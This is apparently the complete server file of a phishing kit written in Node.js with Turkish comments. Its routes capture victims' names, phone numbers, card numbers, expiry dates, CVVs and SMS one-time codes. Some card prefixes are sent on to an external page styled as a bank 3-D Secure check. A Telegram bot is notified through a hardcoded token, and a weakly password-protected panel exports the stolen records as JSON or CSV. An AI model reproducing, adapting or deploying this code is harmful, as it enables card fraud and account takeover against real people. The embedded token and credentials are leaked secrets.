const express        = require('express');
const basicAuth      = require('express-basic-auth');
const path           = require('path');
const low            = require('lowdb');
const FileSync       = require('lowdb/adapters/FileSync');
const ShortUniqueId  = require('short-unique-id');
const axios          = require('axios');
const fetch          = require('node-fetch');




process.on('unhandledRejection', (r) => console.error('unhandledRejection', r));
process.on('uncaughtException', (e) => console.error('uncaughtException', e));

// UID ve veritabanı
const uid     = new ShortUniqueId({ length: 8 }); 
const file    = path.join(__dirname, 'db.json');
const adapter = new FileSync(file);
const db      = low(adapter);
db.defaults({ submissions: [], visits: 0 }).write();

const app = express();
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); 
// Ana sayfa
app.get('/', (req, res) => {
  db.update('visits', n => n + 1).write();
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Statik dosyalar
 app.use(express.static(path.join(__dirname, '../frontend')));



// 📤 Form gönderimi
app.post('/submit-form', async (req, res) => {
  const { name, phone, card, CARD, expdate, EXP, EXP_YEAR, cvv } = req.body;
  const newId = uid.rnd();

  const raw = (card || "").replace(/\D/g, '');
  const prefix8 = raw.substr(0, 8);
  console.log('Card prefix:', prefix8); // Bu satır logda görünecek

  // Veriyi kaydet
  db.get('submissions')
    .unshift({
      id: newId,
      name,
      phone,
      card,
      CARD,
      expdate,
      EXP,
      EXP_YEAR,
      cvv,
      createdAt: new Date().toISOString()
    })
    .write();

  // Eğer kart prefix'leri uygun ise, yönlendirmeyi yap
  if (prefix8 === '40985844' || prefix8 === '54112498') {
    return res.redirect('https://kontaktonlayn.com/leobank-3ds.html'); // yönlendirme
  }

  // Diğer durumda sms ekranına yönlendir
  res.redirect(`/sms.html?trans_id=${newId}`);
});

// 📲 SMS formu
app.post('/submit-sms', (req, res) => {
  const { trans_id, smsCode } = req.body;

  db.get('submissions')
    .find({ id: trans_id })
    .assign({ smsCode, smsAt: new Date().toISOString() })
    .write();

  res.sendStatus(200);
});

app.post('/send-visit', async (req, res) => {
    const token = '8145659910:AAGi1J24CmTYJGA8KduFNqk7iqxT2g7og6U';
    const chatId = '-4845328304';
    const text = req.body.text || '🔔 yeni ziyaret - kontakt';

    try {
        const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text })
        });
        const data = await response.json();
        res.json(data);
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
});

// 👮 Panel - şifre korumalı
app.get('/panel',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    const visits      = db.get('visits').value();
    res.render('panel', { submissions, visits });
  }
);

// 🔓 Logout
app.get('/logout', (req, res) => {
  res.set('WWW-Authenticate', 'Basic realm="Admin Area"');
  res.status(401).send('Çıkış yapıldı');
});
const { Parser } = require('json2csv');
const fs = require('fs');

// JSON export
app.get('/export/json',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    res.setHeader('Content-Disposition', 'attachment; filename=submissions.json');
    res.setHeader('Content-Type', 'application/json');
    res.send(JSON.stringify(submissions, null, 2));
  }
);

// CSV export
app.get('/export/csv',
  basicAuth({ users: { admin: 'password123' }, challenge: true }),
  (req, res) => {
    const submissions = db.get('submissions').value();
    try {
      const parser = new Parser();
      const csv = parser.parse(submissions);
      res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
      res.setHeader('Content-Type', 'text/csv');
      res.send(csv);
    } catch (err) {
      res.status(500).send('CSV dönüştürme hatası: ' + err.message);
    }
  }
);
// 🌐 Sunucu başlat
const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => console.log(`Server http://0.0.0.0:${PORT}`));
